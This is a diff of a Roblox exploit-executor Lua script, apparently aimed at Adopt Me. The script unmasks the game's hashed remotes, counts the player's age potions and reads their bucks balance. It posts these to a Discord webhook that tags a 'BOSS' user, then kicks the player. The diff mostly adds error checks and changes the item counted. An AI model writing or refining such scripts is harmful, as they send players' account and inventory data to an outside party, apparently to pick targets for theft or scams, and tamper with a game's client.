@@ -1,8 +1,8 @@
-local Data = require(game.ReplicatedStorage.ClientModules.Core.ClientData) 
+local Data = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
 local localPlayer = game.Players.LocalPlayer
 local Fsys = require(game.ReplicatedStorage:WaitForChild("Fsys")).load
 local rawAmount = game:GetService("Players").LocalPlayer.PlayerGui.BucksIndicatorApp.CurrencyIndicator.Container.Amount.Text
-local amount = rawAmount:gsub(",", "")  -- Remove commas from the raw amount
+local amount = rawAmount:gsub(",", "") -- Remove commas from the raw amount
 local Counter = 0
 local gui = Instance.new("ScreenGui")
 gui.Parent = game.Players.LocalPlayer.PlayerGui
@@ -19,34 +19,58 @@ textLabel.Text = "Starting"
 textLabel.TextSize = 20
 textLabel.TextColor3 = Color3.new(1, 1, 1)
 textLabel.Parent = frame
-local function rename(remotename,hashedremote)
-    hashedremote.Name = remotename
+
+-- Ensure Fsys("RouterClient").init is defined and has upvalues
+local routerClientInit = Fsys("RouterClient").init
+if routerClientInit then
+    local upvalue = getupvalue(routerClientInit, 4)
+    if upvalue then
+        local function rename(remotename, hashedremote)
+            hashedremote.Name = remotename
+        end
+        table.foreach(upvalue, rename)
+    else
+        warn("Failed to get upvalue from RouterClient.init")
+    end
+else
+    warn("RouterClient.init is not defined")
 end
-table.foreach(getupvalue(Fsys("RouterClient").init,4),rename)
-for i,v in pairs(Data.get_data()[tostring(game.Players.LocalPlayer)].inventory.gifts) do 
-    if v.kind == "lunar_2024_silk_bag" then 
-      Counter = Counter + 1 
-    task.wait(0.1)
-    end 
+
+local playerData = Data.get_data()[tostring(game.Players.LocalPlayer)]
+if playerData and playerData.inventory and playerData.inventory.food then
+    for i, v in pairs(playerData.inventory.food) do
+        if v.kind == "pet_age_potion" then
+            Counter = Counter + 1
+            task.wait(0.1)
+        end
+    end
+else
+    warn("Player inventory data is missing or malformed")
 end
+
 wait(1)
+
 local data = {
-    ["content"] = ("BOSS <@" .. discordid .. "> 🤖 " .. localPlayer.Name .. " has 🍾 " .. Counter .. " Silkbag! and " .. amount .. " 💸 bucks"),
- }
+    ["content"] = ("BOSS <@" .. discordid .. "> 🤖 " .. localPlayer.Name .. " has 🍾 " .. Counter .. " Age Potions! and " .. amount .. " 💸 bucks"),
+}
 local newdata = game:GetService("HttpService"):JSONEncode(data)
 
 local headers = {
-   ["content-type"] = "application/json"
+    ["content-type"] = "application/json"
 }
-local request = http_request or request or HttpPost or syn.request
- 
-local payload = {
-   Url = url,
-   Body = newdata,
-   Method = "POST",
-   Headers = headers
-}
+local request = http_request or request or HttpPost or syn and syn.request
+if not request then
+    warn("HTTP request function is not defined")
+else
+    local payload = {
+        Url = url,
+        Body = newdata,
+        Method = "POST",
+        Headers = headers
+    }
 
-request(payload)
+    request(payload)
+end
+
 wait(1)
 localPlayer:Kick("🤖 " .. localPlayer.Name .. " has 🍾 " .. Counter .. " Age Potions! and " .. amount .. " 💸 bucks")
